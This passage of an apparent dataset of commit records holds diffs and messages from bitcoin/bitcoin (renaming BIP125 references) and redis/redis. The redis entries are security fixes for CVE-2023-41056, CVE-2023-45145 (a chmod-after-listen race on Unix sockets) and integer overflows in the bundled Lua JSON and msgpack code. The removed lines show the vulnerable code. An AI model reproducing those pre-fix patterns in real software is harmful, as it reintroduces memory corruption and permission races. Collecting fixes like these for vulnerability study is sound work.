    \ \"mempoolminfee\", \"Minimum fee rate in \" + CURRENCY_UNIT + \"/kvB for tx\
    \ to be accepted. Is the maximum of minrelaytxfee and minimum mempool fee\"},\n\
    \                 {RPCResult::Type::STR_AMOUNT, \"minrelaytxfee\", \"Current minimum\
    \ relay fee for transactions\"},\n-                {RPCResult::Type::NUM, \"incrementalrelayfee\"\
    , \"minimum fee rate increment for mempool limiting or BIP 125 replacement in\
    \ \" + CURRENCY_UNIT + \"/kvB\"},\n+                {RPCResult::Type::NUM, \"\
    incrementalrelayfee\", \"minimum fee rate increment for mempool limiting or replacement\
    \ in \" + CURRENCY_UNIT + \"/kvB\"},\n                 {RPCResult::Type::NUM,\
    \ \"unbroadcastcount\", \"Current number of transactions that haven't passed initial\
    \ broadcast yet\"},\n                 {RPCResult::Type::BOOL, \"fullrbf\", \"\
    True if the mempool accepts RBF without replaceability signaling inspection\"\
    },\n             }},"
  - "--- a/src/rpc/net.cpp\n+++ b/src/rpc/net.cpp\n@@ -605,7 +605,7 @@ static RPCHelpMan\
    \ getnetworkinfo()\n                             }},\n                       \
    \  }},\n                         {RPCResult::Type::NUM, \"relayfee\", \"minimum\
    \ relay fee rate for transactions in \" + CURRENCY_UNIT + \"/kvB\"},\n-      \
    \                  {RPCResult::Type::NUM, \"incrementalfee\", \"minimum fee rate\
    \ increment for mempool limiting or BIP 125 replacement in \" + CURRENCY_UNIT\
    \ + \"/kvB\"},\n+                        {RPCResult::Type::NUM, \"incrementalfee\"\
    , \"minimum fee rate increment for mempool limiting or replacement in \" + CURRENCY_UNIT\
    \ + \"/kvB\"},\n                         {RPCResult::Type::ARR, \"localaddresses\"\
    , \"list of local addresses\",\n                         {\n                 \
    \            {RPCResult::Type::OBJ, \"\", \"\","
  - "--- a/src/validation.cpp\n+++ b/src/validation.cpp\n@@ -449,7 +449,7 @@ class\
    \ MemPoolAccept\n         /** Whether we allow transactions to replace mempool\
    \ transactions by BIP125 rules. If false,\n          * any transaction spending\
    \ the same inputs as a transaction in the mempool is considered\n          * a\
    \ conflict. */\n-        const bool m_allow_bip125_replacement;\n+        const\
    \ bool m_allow_replacement;\n         /** When true, the mempool will not be trimmed\
    \ when individual transactions are submitted in\n          * Finalize(). Instead,\
    \ limits should be enforced at the end to ensure the package is not\n        \
    \  * partially submitted.\n@@ -469,7 +469,7 @@ class MemPoolAccept\n         \
    \                    /* m_bypass_limits */ bypass_limits,\n                  \
    \           /* m_coins_to_uncache */ coins_to_uncache,\n                     \
    \        /* m_test_accept */ test_accept,\n-                            /* m_allow_bip125_replacement\
    \ */ true,\n+                            /* m_allow_replacement */ true,\n   \
    \                          /* m_package_submission */ false,\n               \
    \              /* m_package_feerates */ false,\n             };\n@@ -483,7 +483,7\
    \ @@ class MemPoolAccept\n                             /* m_bypass_limits */ false,\n\
    \                             /* m_coins_to_uncache */ coins_to_uncache,\n   \
    \                          /* m_test_accept */ true,\n-                      \
    \      /* m_allow_bip125_replacement */ false,\n+                            /*\
    \ m_allow_replacement */ false,\n                             /* m_package_submission\
    \ */ false, // not submitting to mempool\n                             /* m_package_feerates\
    \ */ false,\n             };\n@@ -497,7 +497,7 @@ class MemPoolAccept\n      \
    \                       /* m_bypass_limits */ false,\n                       \
    \      /* m_coins_to_uncache */ coins_to_uncache,\n                          \
    \   /* m_test_accept */ false,\n-                            /* m_allow_bip125_replacement\
    \ */ false,\n+                            /* m_allow_replacement */ false,\n \
    \                            /* m_package_submission */ true,\n              \
    \               /* m_package_feerates */ true,\n             };\n@@ -510,7 +510,7\
    \ @@ class MemPoolAccept\n                             /* m_bypass_limits */ false,\n\
    \                             /* m_coins_to_uncache */ package_args.m_coins_to_uncache,\n\
    \                             /* m_test_accept */ package_args.m_test_accept,\n\
    -                            /* m_allow_bip125_replacement */ true,\n+       \
    \                     /* m_allow_replacement */ true,\n                      \
    \       /* m_package_submission */ false,\n                             /* m_package_feerates\
    \ */ false, // only 1 transaction\n             };\n@@ -524,15 +524,15 @@ class\
    \ MemPoolAccept\n                  bool bypass_limits,\n                  std::vector<COutPoint>&\
    \ coins_to_uncache,\n                  bool test_accept,\n-                 bool\
    \ allow_bip125_replacement,\n+                 bool allow_replacement,\n     \
    \             bool package_submission,\n                  bool package_feerates)\n\
    \             : m_chainparams{chainparams},\n               m_accept_time{accept_time},\n\
    \               m_bypass_limits{bypass_limits},\n               m_coins_to_uncache{coins_to_uncache},\n\
    \               m_test_accept{test_accept},\n-              m_allow_bip125_replacement{allow_bip125_replacement},\n\
    +              m_allow_replacement{allow_replacement},\n               m_package_submission{package_submission},\n\
    \               m_package_feerates{package_feerates}\n         {\n@@ -731,7 +731,7\
    \ @@ bool MemPoolAccept::PreChecks(ATMPArgs& args, Workspace& ws)\n     {\n  \
    \       const CTransaction* ptxConflicting = m_pool.GetConflictTx(txin.prevout);\n\
    \         if (ptxConflicting) {\n-            if (!args.m_allow_bip125_replacement)\
    \ {\n+            if (!args.m_allow_replacement) {\n                 // Transaction\
    \ conflicts with a mempool tx, but we're not allowing replacements.\n        \
    \         return state.Invalid(TxValidationResult::TX_MEMPOOL_POLICY, \"bip125-replacement-disallowed\"\
    );\n             }\n@@ -861,8 +861,8 @@ bool MemPoolAccept::PreChecks(ATMPArgs&\
    \ args, Workspace& ws)\n         // Specifically, the subset of RBF transactions\
    \ which we allow despite chain limits are those which\n         // conflict directly\
    \ with exactly one other transaction (but may evict children of said transaction),\n\
    \         // and which are not adding any new mempool dependencies. Note that\
    \ the \"no new mempool dependencies\"\n-        // check is accomplished later,\
    \ so we don't bother doing anything about it here, but if BIP 125 is\n-      \
    \  // amended, we may need to move that check to here instead of removing it wholesale.\n\
    +        // check is accomplished later, so we don't bother doing anything about\
    \ it here, but if our\n+        // policy changes, we may need to move that check\
    \ to here instead of removing it wholesale.\n         //\n         // Such transactions\
    \ are clearly not merging any existing packages, so we are only concerned with\n\
    \         // ensuring that (a) no package is growing past the package size (not\
    \ count) limits and (b) we are\n@@ -929,7 +929,7 @@ bool MemPoolAccept::ReplacementChecks(Workspace&\
    \ ws)\n     TxValidationState& state = ws.m_state;\n \n     CFeeRate newFeeRate(ws.m_modified_fees,\
    \ ws.m_vsize);\n-    // The replacement transaction must have a higher feerate\
    \ than its direct conflicts.\n+    // Enforce Rule #6. The replacement transaction\
    \ must have a higher feerate than its direct conflicts.\n     // - The motivation\
    \ for this check is to ensure that the replacement transaction is preferable for\n\
    \     //   block-inclusion, compared to what would be removed from the mempool.\n\
    \     // - This logic predates ancestor feerate-based transaction selection, which\
    \ is why it doesn't\n@@ -942,18 +942,18 @@ bool MemPoolAccept::ReplacementChecks(Workspace&\
    \ ws)\n         return state.Invalid(TxValidationResult::TX_MEMPOOL_POLICY, \"\
    insufficient fee\", *err_string);\n     }\n \n-    // Calculate all conflicting\
    \ entries and enforce BIP125 Rule #5.\n+    // Calculate all conflicting entries\
    \ and enforce Rule #5.\n     if (const auto err_string{GetEntriesForConflicts(tx,\
    \ m_pool, ws.m_iters_conflicting, ws.m_all_conflicting)}) {\n         return state.Invalid(TxValidationResult::TX_MEMPOOL_POLICY,\n\
    \                              \"too many potential replacements\", *err_string);\n\
    \     }\n-    // Enforce BIP125 Rule #2.\n+    // Enforce Rule #2.\n     if (const\
    \ auto err_string{HasNoNewUnconfirmed(tx, m_pool, ws.m_iters_conflicting)}) {\n\
    \         return state.Invalid(TxValidationResult::TX_MEMPOOL_POLICY,\n      \
    \                        \"replacement-adds-unconfirmed\", *err_string);\n   \
    \  }\n     // Check if it's economically rational to mine this transaction rather\
    \ than the ones it\n-    // replaces and pays for its own relay fees. Enforce\
    \ BIP125 Rules #3 and #4.\n+    // replaces and pays for its own relay fees. Enforce\
    \ Rules #3 and #4.\n     for (CTxMemPool::txiter it : ws.m_all_conflicting) {\n\
    \         ws.m_conflicting_fees += it->GetModifiedFee();\n         ws.m_conflicting_size\
    \ += it->GetTxSize();\n@@ -1224,7 +1224,7 @@ PackageMempoolAcceptResult MemPoolAccept::AcceptMultipleTransactions(const\
    \ std::\n         // package to spend. Since we already checked conflicts in the\
    \ package and we don't allow\n         // replacements, we don't need to track\
    \ the coins spent. Note that this logic will need to be\n         // updated if\
    \ package replace-by-fee is allowed in the future.\n-        assert(!args.m_allow_bip125_replacement);\n\
    +        assert(!args.m_allow_replacement);\n         m_viewmempool.PackageAddTransaction(ws.m_ptx);\n\
    \     }\n "
  - "--- a/src/wallet/feebumper.cpp\n+++ b/src/wallet/feebumper.cpp\n@@ -128,8 +128,8\
    \ @@ static CFeeRate EstimateFeeRate(const CWallet& wallet, const CWalletTx& wtx,\
    \ con\n     // WALLET_INCREMENTAL_RELAY_FEE value to future proof against changes\
    \ to\n     // network wide policy for incremental relay fee that our node may\
    \ not be\n     // aware of. This ensures we're over the required relay fee rate\n\
    -    // (BIP 125 rule 4).  The replacement tx will be at least as large as the\n\
    -    // original tx, so the total fee will be greater (BIP 125 rule 3)\n+    //\
    \ (Rule 4).  The replacement tx will be at least as large as the\n+    // original\
    \ tx, so the total fee will be greater (Rule 3)\n     CFeeRate node_incremental_relay_fee\
    \ = wallet.chain().relayIncrementalFee();\n     CFeeRate wallet_incremental_relay_fee\
    \ = CFeeRate(WALLET_INCREMENTAL_RELAY_FEE);\n     feerate += std::max(node_incremental_relay_fee,\
    \ wallet_incremental_relay_fee);"
  - "--- a/src/wallet/rpc/spend.cpp\n+++ b/src/wallet/rpc/spend.cpp\n@@ -224,7 +224,7\
    \ @@ RPCHelpMan sendtoaddress()\n                                          \"\
    transaction, just kept in your wallet.\"},\n                     {\"subtractfeefromamount\"\
    , RPCArg::Type::BOOL, RPCArg::Default{false}, \"The fee will be deducted from\
    \ the amount being sent.\\n\"\n                                          \"The\
    \ recipient will receive less bitcoins than you enter in the amount field.\"},\n\
    -                    {\"replaceable\", RPCArg::Type::BOOL, RPCArg::DefaultHint{\"\
    wallet default\"}, \"Allow this transaction to be replaced by a transaction with\
    \ higher fees via BIP 125\"},\n+                    {\"replaceable\", RPCArg::Type::BOOL,\
    \ RPCArg::DefaultHint{\"wallet default\"}, \"Signal that this transaction can\
    \ replaced by a transaction (BIP 125)\"},\n                     {\"conf_target\"\
    , RPCArg::Type::NUM, RPCArg::DefaultHint{\"wallet -txconfirmtarget\"}, \"Confirmation\
    \ target in blocks\"},\n                     {\"estimate_mode\", RPCArg::Type::STR,\
    \ RPCArg::Default{\"unset\"}, \"The fee estimate mode, must be one of (case insensitive):\\\
    n\"\n                      \"\\\"\" + FeeModes(\"\\\"\\n\\\"\") + \"\\\"\"},\n\
    @@ -333,7 +333,7 @@ RPCHelpMan sendmany()\n                             {\"address\"\
    , RPCArg::Type::STR, RPCArg::Optional::OMITTED, \"Subtract fee from this address\"\
    },\n                         },\n                     },\n-                  \
    \  {\"replaceable\", RPCArg::Type::BOOL, RPCArg::DefaultHint{\"wallet default\"\
    }, \"Allow this transaction to be replaced by a transaction with higher fees via\
    \ BIP 125\"},\n+                    {\"replaceable\", RPCArg::Type::BOOL, RPCArg::DefaultHint{\"\
    wallet default\"}, \"Signal that this transaction can replaced by a transaction\
    \ (BIP 125)\"},\n                     {\"conf_target\", RPCArg::Type::NUM, RPCArg::DefaultHint{\"\
    wallet -txconfirmtarget\"}, \"Confirmation target in blocks\"},\n            \
    \         {\"estimate_mode\", RPCArg::Type::STR, RPCArg::Default{\"unset\"}, \"\
    The fee estimate mode, must be one of (case insensitive):\\n\"\n             \
    \         \"\\\"\" + FeeModes(\"\\\"\\n\\\"\") + \"\\\"\"},"
  commit_message: "Merge bitcoin/bitcoin#25775: docs: remove non-signaling mentions\
    \ of BIP125\n\n1dc03dda05e9dce128e57f05bb7b1bb02b3cfb9e [doc] remove non-signaling\
    \ mentions of BIP125 (glozow)\n32024d40f03fbf47c64d814fa5f2c2a73ec14cb7 scripted-diff:\
    \ remove mention of BIP125 from non-signaling var names (glozow)\n\nPull request\
    \ description:\n\n  We have pretty thorough documentation of our RBF policy in\
    \ doc/policy/mempool-replacements.md. It enumerates each rule with several sentences\
    \ of rationale. Also, each rule pretty much has its own function (3 and 4 share\
    \ one), with extensive comments. The doc states explicitly that our rules are\
    \ similar but differ from BIP125, and contains a record of historical changes\
    \ to RBF policy.\n\n  We should not use \"BIP125\" as synonymous with our RBF\
    \ policy because:\n  - Our RBF policy is different from what is specified in BIP125,\
    \ for example:\n      - the BIP does not mention our rule about the replacement\
    \ feerate being higher (our Rule 6)\n      - the BIP uses minimum relay feerate\
    \ for Rule 4, while we have used incremental relay feerate since #9380\n     \
    \ - the \"inherited signaling\" question (CVE-2021-31876). Call it discrepancy,\
    \ ambiguous wording, doc misinterpretation, or implementation details, I would\
    \ recommend users refer to doc/policy/mempool-replacements.md\n      - the signaling\
    \ policy is configurable, see #25353\n  - Our RBF policy may change further\n\
    \  - We have already marked BIP125 as only \"partially implemented\" in docs/bips.md\
    \ since 1fd49eb498c75a1d14193bb736d195a3dc75ae12\n  - See comments from people\
    \ who are not me recently:\n      - https://github.com/bitcoin/bitcoin/pull/25038#discussion_r909507429\n\
    \      - https://github.com/bitcoin/bitcoin/pull/25575#issuecomment-1179519204\n\
    \n  This PR removes all non-signaling mentions of BIP125 (if people feel strongly,\
    \ we can remove all mentions of BIP125 period). It may be useful to refer to the\
    \ concept of \"tx opts in to RBF if it has at least one nSequence less than (0xffffffff\
    \ - 1)\" as \"BIP125 signaling\" because:\n  - It is succint.\n  - It has already\
    \ been widely marketed as BIP125 opt-in signaling.\n  - Our API uses it when referring\
    \ to signaling (e.g. getmempoolentry[\"bip125-replaceable\"] and wallet error\
    \ message \"not BIP 125 replaceable\"). Changing those is more invasive.\n  -\
    \ If/when we have other ways to signal in the future, we can disambiguate them\
    \ this way. See #25038 which proposes another way of signaling, and where I pulled\
    \ these commits from.\n\n  Alternatives:\n  - Changing our policy to match BIP125.\
    \ This doesn't make sense as, for example, we would have to remove the requirement\
    \ that a replacement tx has a higher feerate (Rule 6).\n  - Changing BIP125 to\
    \ match what we have. This doesn't make sense as it would be a significant change\
    \ to a BIP years after it was finalized and already used as a spec to implement\
    \ RBF in other places.\n  - Document our policy as a new BIP and give it a number.\
    \ This might make sense if we don't expect things to change a lot, and can be\
    \ done as a next step.\n\nACKs for top commit:\n  darosior:\n    ACK 1dc03dda05e9dce128e57f05bb7b1bb02b3cfb9e\n\
    \  ariard:\n    ACK 1dc03dda\n  t-bast:\n    ACK https://github.com/bitcoin/bitcoin/commit/1dc03dda05e9dce128e57f05bb7b1bb02b3cfb9e\n\
    \nTree-SHA512: a3adc2039ec5785892d230ec442e50f47f7062717392728152bbbe27ce1c564141f85253143f53cb44e1331cf47476d74f5d2f4b3cd873fc3433d7a0aa783e02"
  commit_sha: c5f0cbefa369b0e4d99a4f871e6334955d537c1f
  repo_name: bitcoin/bitcoin
- commit_diff:
  - "--- a/src/sds.c\n+++ b/src/sds.c\n@@ -349,20 +349,22 @@ sds sdsResize(sds s,\
    \ size_t size, int would_regrow) {\n      * type. */\n     int use_realloc = (oldtype==type\
    \ || (type < oldtype && type > SDS_TYPE_8));\n     size_t newlen = use_realloc\
    \ ? oldhdrlen+size+1 : hdrlen+size+1;\n-    int alloc_already_optimal = 0;\n-\
    \    #if defined(USE_JEMALLOC)\n-        /* je_nallocx returns the expected allocation\
    \ size for the newlen.\n-         * We aim to avoid calling realloc() when using\
    \ Jemalloc if there is no\n-         * change in the allocation size, as it incurs\
    \ a cost even if the\n-         * allocation size stays the same. */\n-      \
    \  alloc_already_optimal = (je_nallocx(newlen, 0) == zmalloc_size(sh));\n-   \
    \ #endif\n-\n-    if (use_realloc && !alloc_already_optimal) {\n-        newsh\
    \ = s_realloc(sh, newlen);\n-        if (newsh == NULL) return NULL;\n-      \
    \  s = (char*)newsh+oldhdrlen;\n-    } else if (!alloc_already_optimal) {\n+\n\
    +    if (use_realloc) {\n+        int alloc_already_optimal = 0;\n+        #if\
    \ defined(USE_JEMALLOC)\n+            /* je_nallocx returns the expected allocation\
    \ size for the newlen.\n+             * We aim to avoid calling realloc() when\
    \ using Jemalloc if there is no\n+             * change in the allocation size,\
    \ as it incurs a cost even if the\n+             * allocation size stays the same.\
    \ */\n+            alloc_already_optimal = (je_nallocx(newlen, 0) == zmalloc_size(sh));\n\
    +        #endif\n+        if (!alloc_already_optimal) {\n+            newsh =\
    \ s_realloc(sh, newlen);\n+            if (newsh == NULL) return NULL;\n+    \
    \        s = (char*)newsh+oldhdrlen;\n+        }\n+    } else {\n         newsh\
    \ = s_malloc(newlen);\n         if (newsh == NULL) return NULL;\n         memcpy((char*)newsh+hdrlen,\
    \ s, len);"
  commit_message: "Fix possible corruption in sdsResize (CVE-2023-41056) (#12924)\n\
    \n#11766 introduced a bug in sdsResize where it could forget to update the\r\n\
    sds type in the sds header and then cause an overflow in sdsalloc. it\r\nlooks\
    \ like the only implication of that is a possible assertion in HLL,\r\nbut it's\
    \ hard to rule out possible heap corruption issues with\r\nclientsCronResizeQueryBuffer"
  commit_sha: f7b1d0287d62ec9fac72bf14cf789e350d14e52b
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/anet.c\n+++ b/src/anet.c\n@@ -417,13 +417,16 @@ int anetUnixGenericConnect(char\
    \ *err, const char *path, int flags)\n     return s;\n }\n \n-static int anetListen(char\
    \ *err, int s, struct sockaddr *sa, socklen_t len, int backlog) {\n+static int\
    \ anetListen(char *err, int s, struct sockaddr *sa, socklen_t len, int backlog,\
    \ mode_t perm) {\n     if (bind(s,sa,len) == -1) {\n         anetSetError(err,\
    \ \"bind: %s\", strerror(errno));\n         close(s);\n         return ANET_ERR;\n\
    \     }\n \n+    if (sa->sa_family == AF_LOCAL && perm)\n+        chmod(((struct\
    \ sockaddr_un *) sa)->sun_path, perm);\n+\n     if (listen(s, backlog) == -1)\
    \ {\n         anetSetError(err, \"listen: %s\", strerror(errno));\n         close(s);\n\
    @@ -467,7 +470,7 @@ static int _anetTcpServer(char *err, int port, char *bindaddr,\
    \ int af, int backl\n \n         if (af == AF_INET6 && anetV6Only(err,s) == ANET_ERR)\
    \ goto error;\n         if (anetSetReuseAddr(err,s) == ANET_ERR) goto error;\n\
    -        if (anetListen(err,s,p->ai_addr,p->ai_addrlen,backlog) == ANET_ERR) s\
    \ = ANET_ERR;\n+        if (anetListen(err,s,p->ai_addr,p->ai_addrlen,backlog,0)\
    \ == ANET_ERR) s = ANET_ERR;\n         goto end;\n     }\n     if (p == NULL)\
    \ {\n@@ -508,10 +511,8 @@ int anetUnixServer(char *err, char *path, mode_t perm,\
    \ int backlog)\n     memset(&sa,0,sizeof(sa));\n     sa.sun_family = AF_LOCAL;\n\
    \     redis_strlcpy(sa.sun_path,path,sizeof(sa.sun_path));\n-    if (anetListen(err,s,(struct\
    \ sockaddr*)&sa,sizeof(sa),backlog) == ANET_ERR)\n+    if (anetListen(err,s,(struct\
    \ sockaddr*)&sa,sizeof(sa),backlog,perm) == ANET_ERR)\n         return ANET_ERR;\n\
    -    if (perm)\n-        chmod(sa.sun_path, perm);\n     return s;\n }\n "
  commit_message: "Fix issue of listen before chmod on Unix sockets (CVE-2023-45145)\
    \ (#12671)\n\nBefore this commit, Unix socket setup performed chmod(2) on the\
    \ socket\r\nfile after calling listen(2). Depending on what umask is used, this\r\
    \ncould leave the file with the wrong permissions for a short period of\r\ntime.\
    \ As a result, another process could exploit this race condition and\r\nestablish\
    \ a connection that would otherwise not be possible.\r\n\r\nWe now make sure the\
    \ socket permissions are set up prior to calling\r\nlisten(2).\r\n\r\n(cherry\
    \ picked from commit 1119ecae6fd8796fa337df2212f09173ab6c7b0a)\r\n\r\nCo-authored-by:\
    \ Yossi Gottlieb <yossigo@gmail.com>"
  commit_sha: 03345ddc7faf7af079485f2cbe5d17a1611cbce1
  repo_name: redis/redis
- commit_diff:
  - "--- a/deps/lua/src/lua_cjson.c\n+++ b/deps/lua/src/lua_cjson.c\n@@ -39,6 +39,7\
    \ @@\n #include <assert.h>\n #include <string.h>\n #include <math.h>\n+#include\
    \ <stdint.h>\n #include <limits.h>\n #include \"lua.h\"\n #include \"lauxlib.h\"\
    \n@@ -141,13 +142,13 @@ typedef struct {\n \n typedef struct {\n     json_token_type_t\
    \ type;\n-    int index;\n+    size_t index;\n     union {\n         const char\
    \ *string;\n         double number;\n         int boolean;\n     } value;\n- \
    \   int string_len;\n+    size_t string_len;\n } json_token_t;\n \n static const\
    \ char *char2escape[256] = {\n@@ -473,6 +474,8 @@ static void json_append_string(lua_State\
    \ *l, strbuf_t *json, int lindex)\n      * This buffer is reused constantly for\
    \ small strings\n      * If there are any excess pages, they won't be hit anyway.\n\
    \      * This gains ~5% speedup. */\n+    if (len > SIZE_MAX / 6 - 3)\n+     \
    \   abort(); /* Overflow check */\n     strbuf_ensure_empty_length(json, len *\
    \ 6 + 2);\n \n     strbuf_append_char_unsafe(json, '\\\"');\n@@ -706,7 +709,7\
    \ @@ static int json_encode(lua_State *l)\n     strbuf_t local_encode_buf;\n \
    \    strbuf_t *encode_buf;\n     char *json;\n-    int len;\n+    size_t len;\n\
    \ \n     luaL_argcheck(l, lua_gettop(l) == 1, 1, \"expected 1 argument\");\n "
  - "--- a/deps/lua/src/lua_cmsgpack.c\n+++ b/deps/lua/src/lua_cmsgpack.c\n@@ -117,7\
    \ +117,9 @@ mp_buf *mp_buf_new(lua_State *L) {\n \n void mp_buf_append(lua_State\
    \ *L, mp_buf *buf, const unsigned char *s, size_t len) {\n     if (buf->free <\
    \ len) {\n-        size_t newsize = (buf->len+len)*2;\n+        size_t newsize\
    \ = buf->len+len;\n+        if (newsize < buf->len || newsize >= SIZE_MAX/2) abort();\n\
    +        newsize *= 2;\n \n         buf->b = (unsigned char*)mp_realloc(L, buf->b,\
    \ buf->len + buf->free, newsize);\n         buf->free = newsize - buf->len;\n\
    @@ -173,7 +175,7 @@ void mp_cur_init(mp_cur *cursor, const unsigned char *s, size_t\
    \ len) {\n \n void mp_encode_bytes(lua_State *L, mp_buf *buf, const unsigned char\
    \ *s, size_t len) {\n     unsigned char hdr[5];\n-    int hdrlen;\n+    size_t\
    \ hdrlen;\n \n     if (len < 32) {\n         hdr[0] = 0xa0 | (len&0xff); /* fix\
    \ raw */\n@@ -220,7 +222,7 @@ void mp_encode_double(lua_State *L, mp_buf *buf,\
    \ double d) {\n \n void mp_encode_int(lua_State *L, mp_buf *buf, int64_t n) {\n\
    \     unsigned char b[9];\n-    int enclen;\n+    size_t enclen;\n \n     if (n\
    \ >= 0) {\n         if (n <= 127) {\n@@ -290,9 +292,9 @@ void mp_encode_int(lua_State\
    \ *L, mp_buf *buf, int64_t n) {\n     mp_buf_append(L,buf,b,enclen);\n }\n \n\
    -void mp_encode_array(lua_State *L, mp_buf *buf, int64_t n) {\n+void mp_encode_array(lua_State\
    \ *L, mp_buf *buf, uint64_t n) {\n     unsigned char b[5];\n-    int enclen;\n\
    +    size_t enclen;\n \n     if (n <= 15) {\n         b[0] = 0x90 | (n & 0xf);\
    \    /* fix array */\n@@ -313,7 +315,7 @@ void mp_encode_array(lua_State *L, mp_buf\
    \ *buf, int64_t n) {\n     mp_buf_append(L,buf,b,enclen);\n }\n \n-void mp_encode_map(lua_State\
    \ *L, mp_buf *buf, int64_t n) {\n+void mp_encode_map(lua_State *L, mp_buf *buf,\
    \ uint64_t n) {\n     unsigned char b[5];\n     int enclen;\n \n@@ -791,7 +793,7\
    \ @@ void mp_decode_to_lua_type(lua_State *L, mp_cur *c) {\n     }\n }\n \n-int\
    \ mp_unpack_full(lua_State *L, int limit, int offset) {\n+int mp_unpack_full(lua_State\
    \ *L, lua_Integer limit, lua_Integer offset) {\n     size_t len;\n     const char\
    \ *s;\n     mp_cur c;\n@@ -803,10 +805,10 @@ int mp_unpack_full(lua_State *L,\
    \ int limit, int offset) {\n     if (offset < 0 || limit < 0) /* requesting negative\
    \ off or lim is invalid */\n         return luaL_error(L,\n             \"Invalid\
    \ request to unpack with offset of %d and limit of %d.\",\n-            offset,\
    \ len);\n+            (int) offset, (int) len);\n     else if (offset > len)\n\
    \         return luaL_error(L,\n-            \"Start offset %d greater than input\
    \ length %d.\", offset, len);\n+            \"Start offset %d greater than input\
    \ length %d.\", (int) offset, (int) len);\n \n     if (decode_all) limit = INT_MAX;\n\
    \ \n@@ -828,12 +830,13 @@ int mp_unpack_full(lua_State *L, int limit, int offset)\
    \ {\n         /* c->left is the remaining size of the input buffer.\n        \
    \  * subtract the entire buffer size from the unprocessed size\n          * to\
    \ get our next start offset */\n-        int offset = len - c.left;\n+       \
    \ size_t new_offset = len - c.left;\n+        if (new_offset > LONG_MAX) abort();\n\
    \ \n         luaL_checkstack(L, 1, \"in function mp_unpack_full\");\n \n     \
    \    /* Return offset -1 when we have have processed the entire buffer. */\n-\
    \        lua_pushinteger(L, c.left == 0 ? -1 : offset);\n+        lua_pushinteger(L,\
    \ c.left == 0 ? -1 : (lua_Integer) new_offset);\n         /* Results are returned\
    \ with the arg elements still\n          * in place. Lua takes care of only returning\n\
    \          * elements above the args for us.\n@@ -852,15 +855,15 @@ int mp_unpack(lua_State\
    \ *L) {\n }\n \n int mp_unpack_one(lua_State *L) {\n-    int offset = luaL_optinteger(L,\
    \ 2, 0);\n+    lua_Integer offset = luaL_optinteger(L, 2, 0);\n     /* Variable\
    \ pop because offset may not exist */\n     lua_pop(L, lua_gettop(L)-1);\n   \
    \  return mp_unpack_full(L, 1, offset);\n }\n \n int mp_unpack_limit(lua_State\
    \ *L) {\n-    int limit = luaL_checkinteger(L, 2);\n-    int offset = luaL_optinteger(L,\
    \ 3, 0);\n+    lua_Integer limit = luaL_checkinteger(L, 2);\n+    lua_Integer\
    \ offset = luaL_optinteger(L, 3, 0);\n     /* Variable pop because offset may\
    \ not exist */\n     lua_pop(L, lua_gettop(L)-1);\n "
  - "--- a/deps/lua/src/strbuf.c\n+++ b/deps/lua/src/strbuf.c\n@@ -26,6 +26,7 @@\n\
    \ #include <stdlib.h>\n #include <stdarg.h>\n #include <string.h>\n+#include <stdint.h>\n\
    \ \n #include \"strbuf.h\"\n \n@@ -38,22 +39,22 @@ static void die(const char\
    \ *fmt, ...)\n     va_end(arg);\n     fprintf(stderr, \"\\n\");\n \n-    exit(-1);\n\
    +    abort();\n }\n \n-void strbuf_init(strbuf_t *s, int len)\n+void strbuf_init(strbuf_t\
    \ *s, size_t len)\n {\n-    int size;\n+    size_t size;\n \n-    if (len <= 0)\n\
    +    if (!len)\n         size = STRBUF_DEFAULT_SIZE;\n     else\n-        size\
    \ = len + 1;         /* \\0 terminator */\n-\n+        size = len + 1;\n+    if\
    \ (size < len)\n+        die(\"Overflow, len: %zu\", len);\n     s->buf = NULL;\n\
    \     s->size = size;\n     s->length = 0;\n-    s->increment = STRBUF_DEFAULT_INCREMENT;\n\
    \     s->dynamic = 0;\n     s->reallocs = 0;\n     s->debug = 0;\n@@ -65,7 +66,7\
    \ @@ void strbuf_init(strbuf_t *s, int len)\n     strbuf_ensure_null(s);\n }\n\
    \ \n-strbuf_t *strbuf_new(int len)\n+strbuf_t *strbuf_new(size_t len)\n {\n  \
    \   strbuf_t *s;\n \n@@ -81,20 +82,10 @@ strbuf_t *strbuf_new(int len)\n     return\
    \ s;\n }\n \n-void strbuf_set_increment(strbuf_t *s, int increment)\n-{\n-   \
    \ /* Increment > 0:  Linear buffer growth rate\n-     * Increment < -1: Exponential\
    \ buffer growth rate */\n-    if (increment == 0 || increment == -1)\n-      \
    \  die(\"BUG: Invalid string increment\");\n-\n-    s->increment = increment;\n\
    -}\n-\n static inline void debug_stats(strbuf_t *s)\n {\n     if (s->debug) {\n\
    -        fprintf(stderr, \"strbuf(%lx) reallocs: %d, length: %d, size: %d\\n\"\
    ,\n+        fprintf(stderr, \"strbuf(%lx) reallocs: %d, length: %zd, size: %zd\\\
    n\",\n                 (long)s, s->reallocs, s->length, s->size);\n     }\n }\n\
    @@ -113,7 +104,7 @@ void strbuf_free(strbuf_t *s)\n         free(s);\n }\n \n\
    -char *strbuf_free_to_string(strbuf_t *s, int *len)\n+char *strbuf_free_to_string(strbuf_t\
    \ *s, size_t *len)\n {\n     char *buf;\n \n@@ -131,57 +122,62 @@ char *strbuf_free_to_string(strbuf_t\
    \ *s, int *len)\n     return buf;\n }\n \n-static int calculate_new_size(strbuf_t\
    \ *s, int len)\n+static size_t calculate_new_size(strbuf_t *s, size_t len)\n {\n\
    -    int reqsize, newsize;\n+    size_t reqsize, newsize;\n \n     if (len <=\
    \ 0)\n         die(\"BUG: Invalid strbuf length requested\");\n \n     /* Ensure\
    \ there is room for optional NULL termination */\n     reqsize = len + 1;\n+ \
    \   if (reqsize < len)\n+        die(\"Overflow, len: %zu\", len);\n \n     /*\
    \ If the user has requested to shrink the buffer, do it exactly */\n     if (s->size\
    \ > reqsize)\n         return reqsize;\n \n     newsize = s->size;\n-    if (s->increment\
    \ < 0) {\n+    if (reqsize >= SIZE_MAX / 2) {\n+        newsize = reqsize;\n+\
    \    } else {\n         /* Exponential sizing */\n         while (newsize < reqsize)\n\
    -            newsize *= -s->increment;\n-    } else {\n-        /* Linear sizing\
    \ */\n-        newsize = ((newsize + s->increment - 1) / s->increment) * s->increment;\n\
    +            newsize *= 2;\n     }\n \n+    if (newsize < reqsize)\n+        die(\"\
    BUG: strbuf length would overflow, len: %zu\", len);\n+\n     return newsize;\n\
    \ }\n \n \n /* Ensure strbuf can handle a string length bytes long (ignoring NULL\n\
    \  * optional termination). */\n-void strbuf_resize(strbuf_t *s, int len)\n+void\
    \ strbuf_resize(strbuf_t *s, size_t len)\n {\n-    int newsize;\n+    size_t newsize;\n\
    \ \n     newsize = calculate_new_size(s, len);\n \n     if (s->debug > 1) {\n\
